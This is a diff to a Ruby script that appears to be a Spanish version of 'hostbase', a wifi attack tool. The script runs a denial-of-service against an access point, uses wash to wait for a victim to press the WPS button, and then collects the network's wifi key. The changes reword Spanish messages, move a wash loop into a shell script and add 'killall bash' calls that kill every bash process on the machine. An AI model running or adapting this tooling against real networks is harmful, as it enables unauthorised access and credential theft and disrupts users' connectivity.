@@ -7,7 +7,7 @@ require 'highline/import'
 
 
 trap "SIGINT" do
-  puts "\e[1;94m[*] Exit... limpieza de los ficheros\e[0m"
+  puts "\e[1;94m[*] Exit... limpieza de ficheros...\e[0m"
 sleep 3
 Dir.chdir '/tmp/hostbase-1.4ES'
 sleep 1
@@ -22,6 +22,7 @@ sleep 1
 `killall dhcpd`
 `killall wash`
 `killall wpa_supplicant`
+`killall bash`
 Dir.chdir '/tmp/hostbase-1.4ES'
 sleep 1
 `rm -rf *.pid`
@@ -31,7 +32,7 @@ $cartef = cartef.chomp
 File.open("cartebis.txt").readlines.each do |cartebis|
    puts cartebis
 $cartebis = cartebis.chomp
-puts "Iniciando la tarjetas wifi..."
+puts "Vuelta a la normal de las tarjetas wifi..."
 `ifconfig #{$cartef} down`
 `iw dev #{$cartef} set type managed`
 sleep 2
@@ -64,7 +65,7 @@ Dir.chdir '/tmp/hostbase-1.4ES'
 sleep 1
 `rm -rf *.pid`
 `rm -rf *.txt`
-puts "Iniciando la tarjeta wifi..."
+puts "Vuelta a la normal de las tarjetas wifi..."
 `ifconfig wlan5 down`
 `ip link set wlan5 name wlan1`
 `ip link set wlan1 down`
@@ -78,6 +79,8 @@ sleep 4
 `systemctl start NetworkManager.service`
 sleep 5
 `rm -rf /var/lib/dhcp/dhcpd.leases`
+`killall wash`
+`killall bash`
 puts "Bye..."
 exit
 end
@@ -103,17 +106,9 @@ sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici défi
 end
 
 
-def self.victimeAttente   
-Dir.chdir '/tmp/hostbase-1.4ES'
-sleep 2
-load 'historique.rb'
-puts "Esperamons que alguien se conecta... ctrl+c para salir..."
-wash = Thread.new do
-  while true
-    system "wash -i #{$cartedos} -b #{$apmac} -j > wash.txt"   # On lance hostapd_cli wps_pbc en tant que thread
-sleep(20)     # Temps avant la relance de la commande
-  end
-end
+def self.victimeAttente      
+puts "Iniciando wash..."
+wash = Thread.new { `bash wash.sh` }
 Setup.wpsPush # on appelle la fonction dont on a besoin
 sleep(5000000)        
        # Lancement de hostapd_cli a rajouter ici
@@ -121,15 +116,18 @@ sleep(5000000)
        # Voir nohup ou xterm -e
    end
    
+   
    def self.wpsPush 
 Dir.chdir '/tmp/hostbase-1.4ES'
 sleep 2
+puts "Esperamos que alguien se conecta... ctrl+c para salir..."
 until File.read('wash.txt').include?('wps_selected_registrar')
 sleep 1
 end
-puts "\e[1;32m[[*] Alguièn se ha conectado y el boton WPS ha sido apyado...\e[0m"
+puts "\e[1;32m[[*] Un uasario se ha conectado y el boton WPS ha sido apoyado...\e[0m"
 puts "\e[1;32m[*] Paramos la DoS...\e[0m"
 Process.kill 15, File.read('/tmp/terminal.pid').to_i
+Process.kill 15, File.read('/tmp/hostbase-1.4ES/wash.pid').to_i
 `killall wash`
 if File.exist?("terminalfrequence.pid")
 sleep 1
@@ -150,7 +148,7 @@ sleep 3
 `rfkill unblock all`
 `ip link set #{$cartedos} up`
 sleep 6
-       puts "\e[1;32m[*] Esperamos de tener la clave wifi...\e[0m"
+       puts "\e[1;32m[*] Esperamos la clave wifi...\e[0m"
 `killall wpa_supplicant`
 Dir.chdir '/etc'    
 sleep 1
